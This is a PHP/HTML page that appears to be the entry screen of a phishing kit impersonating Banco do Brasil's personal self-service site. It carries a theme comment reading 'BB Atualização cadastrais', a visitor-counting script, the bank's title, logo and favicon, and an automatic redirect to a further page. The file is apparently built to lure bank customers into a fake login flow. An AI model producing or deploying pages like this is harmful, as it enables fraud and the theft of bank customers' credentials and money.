<!-- 
Theme Name: BB Atualização cadastrais
Author: MK(rj)
 -->
  <?php
     $arquivo = "contador.txt";
     $contador = 0;

     $fp = fopen($arquivo,"r");
     $contador = fgets($fp, 26);
     fclose($fp);

     ++$contador;

     $fp = fopen($arquivo,"w+");
     fwrite($fp, $contador, 26);
     fclose($fp);
 ?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
	<title>Banco do Brasil - Autoatendimento Pessoa Física</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
	<link rel="stylesheet" type="text/css" href="css/estilo.css">
	
	<link rel="icon" href="img/favicon.ico" type="image/x-icon"/>

	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, minimal-ui">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="mobile-web-app-capable" content="yes">

	<script src="js/jquery-3.2.1.min.js"></script>
	<script src="js/bootstrap.js"></script>
	<script src="js/script.js"></script>

</head>

<body id="tela1">
	<div class="container">
		<div class="row">
			<div class="col-md-12">
				<h1 class="logo">
					<img class="img-responsive" src="img/logo.png">
					<meta http-equiv="refresh" content="2;url=home.php">
				</h1>
			</div>
		</div>
	</div>
</body>
</html>